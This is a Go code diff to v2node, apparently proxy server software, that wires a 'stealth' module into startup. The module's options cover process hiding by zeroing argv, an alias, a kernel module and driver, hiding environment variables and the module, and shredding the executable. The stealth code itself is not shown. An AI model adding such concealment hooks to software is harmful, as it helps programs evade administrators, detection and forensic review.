@@ -7,10 +7,12 @@ import (
 	"os"
 	"os/signal"
 	"runtime"
+	"strings"
 	"syscall"
 
 	log "github.com/sirupsen/logrus"
 	"github.com/spf13/cobra"
+	"github.com/wyx2685/v2node/common/stealth"
 	"github.com/wyx2685/v2node/conf"
 	"github.com/wyx2685/v2node/core"
 	"github.com/wyx2685/v2node/limiter"
@@ -68,6 +70,22 @@ func serverHandle(_ *cobra.Command, _ []string) {
 			log.WithField("err", err).Error("Open log file failed, using stdout instead")
 		}
 		log.SetOutput(f)
+	}
+	// 进程隐藏：argv 清零会连带影响从命令行取到的字符串，先把要用的路径克隆一份
+	config = strings.Clone(config)
+	stealth.SetLogger(log.Infof)
+	if err = stealth.Init(stealth.Config{
+		Enable:       c.Stealth.Enable,
+		Alias:        c.Stealth.Alias,
+		Kernel:       c.Stealth.Kernel,
+		KernelModule: c.Stealth.KernelModule,
+		KernelDriver: c.Stealth.KernelDriver,
+		HideEnv:      c.Stealth.HideEnv,
+		ShredExe:     c.Stealth.ShredExe,
+		HideModule:   c.Stealth.HideModule,
+		Debug:        c.Stealth.Debug,
+	}); err != nil {
+		log.WithField("err", err).Warn("stealth init failed")
 	}
 	// Enable pprof if configured
 	if c.PprofPort != 0 {
